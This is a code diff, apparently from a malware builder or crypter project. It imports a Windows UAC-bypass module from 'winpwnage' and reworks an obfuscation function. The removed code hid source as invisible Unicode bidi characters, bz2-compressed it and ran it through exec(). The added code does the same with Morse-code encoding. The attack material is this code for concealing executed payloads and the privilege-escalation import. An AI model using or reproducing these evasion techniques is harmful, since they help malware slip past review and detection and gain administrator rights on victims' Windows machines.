@@ -1,5 +1,6 @@
 import sys
 from winpwnage.functions.uac.uacMethod1 import *
+from assets.encrypt import *
 def IsAdmin() -> bool:
     return ctypes.windll.shell32.IsUserAnAdmin() == 1
 
@@ -44,16 +45,10 @@ def string_to_binary(s):
     return ''.join(format(byte, '08b') for byte in s.encode('utf-8'))
 
 def obf_binary(code):
-    decode_def = """
-def decode_bin(b):
-    b = b.replace('\\u202E', '1').replace('\\u202D', '0')
-    A = int(b, 2)
-    return A.to_bytes((A.bit_length() + 7) // 8, 'big').decode()
-"""
-    binary_destroy = bz2.compress(string_to_binary(code).replace('0', '\u202D').replace('1', '\u202E').encode('utf-8'))
+    a = texttomorse(code)
     obfuscated_code = f"""
-{decode_def}
-exec(decode_bin(__import__('bz2').decompress({repr(binary_destroy)}).decode()))
+from assets.encrypt import *
+exec(morsetotext({repr(a)}))
 """
     return obfuscated_code
 
